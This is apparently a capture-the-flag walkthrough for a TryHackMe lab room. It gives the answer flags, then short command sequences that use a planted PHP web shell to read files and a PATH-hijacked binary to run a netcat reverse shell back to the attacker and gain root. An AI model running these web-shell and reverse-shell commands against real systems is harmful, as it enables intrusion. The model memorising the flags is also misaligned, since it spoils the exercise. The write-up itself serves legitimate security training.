# <div align="center">[Hacker vs. Hacker](https://tryhackme.com/r/room/hackervshacker)</div>
<div align="center">Someone has compromised this server already! Can you get in and evade their countermeasures?</div>

<div align="center">
<img src="https://github.com/user-attachments/assets/67671f1b-2ffa-4036-b8d7-3f0abc76a89f" height=""></img>
</div>

## Task 1. Get on and boot them out!

The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?

### What is the user.txt flag?
```
thm{af7e46b68081d4025c5ce10851430617}
```
### What is the proof.txt flag?
```
thm{7b708e5224f666d3562647816ee2a1d4}
```

### User flag
```
nmap -sC -sV <IP>
gobuster dir --url http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 32 -x txt,php,html
# http://<IP>/upload.php
# http://<IP>/cvs/shell.pdf.php
http://<IP>/cvs/shell.pdf.php?cmd=whoami
http://<IP>/cvs/shell.pdf.php?cmd=cat /home/lachlan/user.txt
ssh lachlan@<IP>
```

### Root Flag
```
http://<IP>/cvs/shell.pdf.php?cmd=ls -la /home/lachlan
http://<IP>/cvs/shell.pdf.php?cmd=cat /home/lachlan/.bash_history
http://<IP>/cvs/shell.pdf.php?cmd=cat /etc/cron.d/persistence
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <my_own_IP> 1234 >/tmp/f" > /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill
nc -lvnp 1234
cat /root/root.txt
```
